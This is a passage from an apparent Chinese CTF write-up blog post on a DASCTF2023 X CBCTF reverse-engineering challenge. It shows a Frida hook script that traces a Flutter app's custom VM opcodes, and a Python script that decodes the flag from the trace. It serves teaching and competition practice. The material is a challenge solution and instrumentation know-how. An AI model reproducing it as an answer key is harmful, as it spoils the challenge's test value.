</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;push &quot;</span>, + a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.j.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;store &quot;</span> + a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.k.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;store&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.l.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;xor&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br><span class="line"></span><br><span class="line"><span class="comment">// frida -U -f com.dasctf.vm_flutter.vm_flutter -l vm_flutter.js --no-pause</span></span><br></pre></td></tr></table></figure>



<h3 id="0x02-Get-Flag-4"><a href="#0x02-Get-Flag-4" class="headerlink" title="0x02 Get Flag"></a>0x02 Get Flag</h3><p>作者写的好用的正则表达（改天一定好好学学正则）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">output = <span class="string">&#x27;&#x27;&#x27;push 48</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">push 176</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">push 198</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 2</span></span><br><span class="line"><span class="string">push 66</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 2</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 2</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 3</span></span><br><span class="line"><span class="string">push 199</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 3</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 3</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 4</span></span><br><span class="line"><span class="string">push 170</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">load 4</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 4</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 5</span></span><br><span class="line"><span class="string">push 32</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 5</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 5</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 6</span></span><br><span class="line"><span class="string">push 31</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">load 6</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 6</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 7</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 7</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 7</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 8</span></span><br><span class="line"><span class="string">push 26</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 8</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 8</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 9</span></span><br><span class="line"><span class="string">push 89</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">load 9</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 9</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 10</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 17</span></span><br><span class="line"><span class="string">load 10</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 10</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 11</span></span><br><span class="line"><span class="string">push 119</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 11</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 11</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 12</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 17</span></span><br><span class="line"><span class="string">load 12</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 12</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 13</span></span><br><span class="line"><span class="string">push 90</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 13</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 13</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 14</span></span><br><span class="line"><span class="string">push 104</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 14</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 14</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 15</span></span><br><span class="line"><span class="string">push 174</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 15</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 15</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 16</span></span><br><span class="line"><span class="string">push 146</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 16</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 16</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 17</span></span><br><span class="line"><span class="string">push 179</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 17</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 17</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 18</span></span><br><span class="line"><span class="string">push 67</span></span><br><span class="line"><span class="string">push 15</span></span><br><span class="line"><span class="string">load 18</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 18</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 19</span></span><br><span class="line"><span class="string">push 73</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 19</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 19</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 20</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">push 12</span></span><br><span class="line"><span class="string">load 20</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 20</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 21</span></span><br><span class="line"><span class="string">push 92</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 21</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 21</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 22</span></span><br><span class="line"><span class="string">push 170</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 22</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 22</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 23</span></span><br><span class="line"><span class="string">push 160</span></span><br><span class="line"><span class="string">push 9</span></span><br><span class="line"><span class="string">load 23</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 23</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 24</span></span><br><span class="line"><span class="string">push 166</span></span><br><span class="line"><span class="string">push 15</span></span><br><span class="line"><span class="string">load 24</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 24</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 25</span></span><br><span class="line"><span class="string">push 47</span></span><br><span class="line"><span class="string">push 8</span></span><br><span class="line"><span class="string">load 25</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 25</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 26</span></span><br><span class="line"><span class="string">push 155</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 26</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 26</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 27</span></span><br><span class="line"><span class="string">push 115</span></span><br><span class="line"><span class="string">push 9</span></span><br><span class="line"><span class="string">load 27</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 27</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 28</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 28</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 28</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 29</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">push 12</span></span><br><span class="line"><span class="string">load 29</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 29</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 30</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 30</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 30</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 31</span></span><br><span class="line"><span class="string">push 96</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 31</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 31</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 32</span></span><br><span class="line"><span class="string">push 72</span></span><br><span class="line"><span class="string">push 7</span></span><br><span class="line"><span class="string">load 32</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">store 32&#x27;&#x27;&#x27;</span></span><br><span class="line">pattern = <span class="string">r&#x27;push\s+(\d+)&#x27;</span></span><br><span class="line">final = [<span class="number">255</span>, <span class="number">149</span>, <span class="number">26</span>, <span class="number">146</span>, <span class="number">200</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">36</span>, <span class="number">222</span>, <span class="number">185</span>, <span class="number">240</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">215</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">178</span>, <span class="number">46</span>, <span class="number">205</span>, <span class="number">209</span>,</span><br><span class="line">         <span class="number">214</span>, <span class="number">83</span>, <span class="number">233</span>, <span class="number">34</span>, <span class="number">82</span>, <span class="number">74</span>, <span class="number">67</span>, <span class="number">36</span>, <span class="number">204</span>]</span><br><span class="line">matches = re.findall(pattern, output)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br><span class="line"><span class="comment">#print(matches)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((final[i] ^ (<span class="built_in">int</span>(matches[i * <span class="number">3</span> + <span class="number">1</span>]))) - <span class="built_in">int</span>(matches[i * <span class="number">3</span> + <span class="number">2</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Get Flag!</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027224014770.png" alt="image-20231027224014770"></p>

    </div>

    <p style= "text-align:center">
        让我看看我被读了 
    <b><span id="/2023/10/24/DASCTF2023-X-CBCTF/" class="waline-visitor-count"/>...</b> 次呢🎉</p>
    
    <div id = "frozen-btn" class = "center">
    <!-- <button class="green" onclick = "Change()">🎉☕一杯咖啡~</button> -->
    <button class="purple" onclick = "Change()">🍰</button>
    </div>
    
    <div class = "hide" id = "img">
        <div class="post-list">
            <article class="post-list-item">
                <div class="content">
                    <img src="/img/Coffee/AliPay.png" alt="DASCTF X SU">
                    <div class="center">
                        🍬
                    </div>
                </div>
            </article>
            <article class="post-list-item">
                <div class="content">
                    <img src="/img/Coffee/WeChat.png" alt="HFCTF2022">
                    <div class="center">
                        🍪
                    </div>
                </div>
            </article>
        </div>
    </div>
    <script>
            function Change()
            {
                var img = document.getElementById("img");
                if(img.className == "hide")
                {
                    img.className="";
                }
                else
                {
                    img.className="hide";
                }
            }
    </script>

    <div class="about">
        <h1>About this Post</h1>
        <p>This post is written by P.Z, licensed under <a
                target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
    </div>
    <!-- 
        
     -->
<div class="container">
<!-- <div id="waline"></div>
  <script>
    Waline({
      el: '#waline',
      serverURL: 'https://blog-api-pozeep.vercel.app/',  
      visitor: true,
      emoji: [   //这里加了一些表情 
        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/weibo',
        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili',
        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq',
        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/tieba',
      ],
       avatar: 'robohash',   //自定义默认头像为随机的机器人
       placeholder: '🍟🍰🧊🍔🍓🍫🍦🍗🍇🍉🍑🥐🍕',   //占位符
    });
  </script>
</div> -->

<!-- <span id="/2023/10/24/DASCTF2023-X-CBCTF/" class="leancloud_visitors" data-flag-title="DASCTF2023 X CBCTF">
    <em class="post-meta-item-text">阅读量 </em>
    <i class="waline-visitor-count"></i>
</span> -->

</article>
        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h4 class="title">Blog</h4>
                
                <a href="/" class="item">Home</a>
                
                <a href="/Diary/Diary.html" class="item">Diary</a>
                
                <a href="/Friends/Friends.html" class="item">Friends</a>
                
                <a href="/CTF/CTF.html" class="item">CTF</a>
                
                <a href="/Book/Book.html" class="item">Book</a>
                
            </div>
            
            <div class="group">
                <h4 class="title">Me</h4>
                
                <a target="_blank" rel="noopener" href="https://github.com/PoZeep" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://space.bilibili.com/39892350" class="item">BiliBili</a>
                
            </div>
            
        </div>
        <span>&copy; 2023 P.Z<br >Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
        
    <span id="sitetime" style="text-align: center;display:block;"></span>


</footer>

<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2021, 12, 27, 12, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "我已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了*/
    siteTime();
</script>

<!-- 在线通讯Tidio -->

<script src="//code.tidio.co/zmdcv08a6racnaer2so7xybdwby41fsa.js"></script>



        
<script src="/js/main.js"></script>

        
    </body>
</html>